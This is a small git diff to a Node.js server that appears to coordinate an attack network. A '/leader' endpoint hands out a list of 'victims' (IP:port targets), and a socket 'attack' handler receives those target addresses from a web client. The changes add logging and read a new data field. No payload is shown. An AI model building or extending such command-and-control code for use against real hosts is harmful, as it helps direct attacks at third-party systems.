@@ -87,6 +87,7 @@ app.post("/leader", function(req, res) {
 		console.log("The leader is: " + leader);
 		//Send array of victims
 		//res.send(["134.123.123.12:454", "5.5.5.5:564"]);
+		console.log(addresses2bAttacked);
 		res.send(addresses2bAttacked);
 	} else {
 		res.send("LEADER");
@@ -111,11 +112,10 @@ io.on('connection', function(socket){
 	updateAttackerTime(deviceTime.ID, deviceTime.time);
   });*/
 
-  	// Callback function when a 'connection' socket message is received
-	// When a client connection is established
+  	// Callback function when an 'attack' socket message is received
+	// When recieving the addresses coming from the Web Client
 	socket.on('attack', function(data){
-  		addresses2bAttacked = data;
-
+  		addresses2bAttacked = data.addresses;
 	});
 });
 
